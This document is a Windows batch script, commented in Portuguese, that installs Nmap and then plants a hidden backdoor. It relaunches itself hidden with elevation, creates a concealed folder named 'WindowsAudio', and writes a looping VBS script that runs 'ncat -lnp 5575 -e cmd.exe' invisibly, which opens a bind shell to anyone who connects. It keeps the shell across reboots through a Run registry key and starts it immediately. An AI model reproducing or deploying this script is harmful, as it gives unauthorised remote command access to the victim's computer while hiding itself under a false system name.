@echo off

:: Verificar e perguntar sobre winget
where winget > nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo [1] SIM - Baixar e instalar Winget + Nmap
    echo [2] NAO - Pular (winget ja instalado manualmente)
    echo [3] NAO - Continuar sem Winget (nao instala Nmap)
    echo.
    set /p opcao="Escolha [1/2/3]: "
)

:: Ocultar esta janela imediatamente
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden %opcao%' -WindowStyle Hidden -Verb RunAs"
    exit
)

:: Pegar a opção passada
set opcao=%2

:: Instalar Winget se opção for 1
if "%opcao%"=="1" (
    echo [*] Baixando Winget...
    powershell -NoProfile -WindowStyle Hidden -Command "$url='https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle'; $output=Join-Path $env:TEMP 'winget.msixbundle'; Invoke-WebRequest -Uri $url -OutFile $output" > nul 2>&1
    
    echo [*] Instalando Winget...
    start "" /wait "%TEMP%\winget.msixbundle"
    del "%TEMP%\winget.msixbundle" > nul 2>&1
)

:: Pular Nmap se opção for 3
if "%opcao%"=="3" goto skip_nmap

:: Instalar Nmap (para opções 1 e 2)
echo [*] Instalando Nmap...
winget install Insecure.Nmap --silent --accept-package-agreements --accept-source-agreements > nul 2>&1

:skip_nmap
:: Atualizar PATH com o Nmap
set "PATH=%PATH%;%ProgramFiles(x86)%\Nmap"

:: Criar pasta oculta
mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1

:: Criar audio.vbs
echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\WindowsAudio\audio.vbs"
echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"

:: Criar audio.bat
echo @echo off > "%USERPROFILE%\WindowsAudio\audio.bat"
echo start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs" >> "%USERPROFILE%\WindowsAudio\audio.bat"
echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"

:: Registrar no Windows
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f > nul 2>&1

:: Iniciar listener
start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"

exit
